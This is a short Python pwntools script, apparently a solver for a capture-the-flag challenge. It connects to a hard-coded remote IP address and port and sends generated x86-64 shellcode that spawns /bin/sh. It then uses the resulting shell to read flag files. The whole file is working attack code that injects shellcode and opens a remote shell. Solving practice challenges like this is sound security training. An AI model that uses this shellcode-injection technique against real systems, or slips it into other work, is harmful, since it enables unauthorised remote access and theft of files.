#!/usr/bin/env python3
from pwn import *

# Connect to the server
io = remote('159.89.106.147', 1337)

# Receive the welcome message
data = io.recvuntil(b'Send shellcode (max 4096 bytes):\n')
print(data.decode())

# Simple execve("/bin/sh", ["/bin/sh"], NULL) shellcode for x86-64
shellcode = asm(shellcraft.amd64.linux.sh())

# Send shellcode
io.sendline(shellcode)

# Wait a moment for shell to spawn
time.sleep(1)

# Send command to get flag
io.sendline(b'cat flag*')
time.sleep(1)

# Get the output
output = io.recvall(timeout=2)
print(output.decode())

io.close()
